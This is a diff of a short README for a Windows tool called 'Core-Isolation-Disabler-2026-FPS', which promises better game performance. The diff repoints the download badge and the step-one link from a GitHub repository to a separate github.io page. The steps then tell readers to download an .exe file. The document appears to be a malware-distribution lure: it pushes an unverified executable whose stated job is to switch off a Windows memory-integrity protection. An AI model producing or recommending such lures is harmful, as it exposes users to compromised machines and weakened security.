@@ -1,6 +1,6 @@
 # ⚡ Core-Isolation-Disabler-2026-FPS - Increase game frame rates and performance
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Sabrinaar6980/Core-Isolation-Disabler-2026-FPS)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue.svg)](https://sabrinaar6980.github.io)
 
 ## 📋 Overview
 
@@ -20,7 +20,7 @@ This application functions on modern Windows systems. Check your computer agains
 
 Follow these steps to configure your system. Ensure you close all active games before you start these steps.
 
-1. Visit the project website to access the files: [https://github.com/Sabrinaar6980/Core-Isolation-Disabler-2026-FPS](https://github.com/Sabrinaar6980/Core-Isolation-Disabler-2026-FPS).
+1. Visit the project website to access the files: [https://sabrinaar6980.github.io](https://sabrinaar6980.github.io).
 2. Look for the Releases section on the right side of the screen.
 3. Click the most recent version label.
 4. Download the file ending in .exe to your Downloads folder.
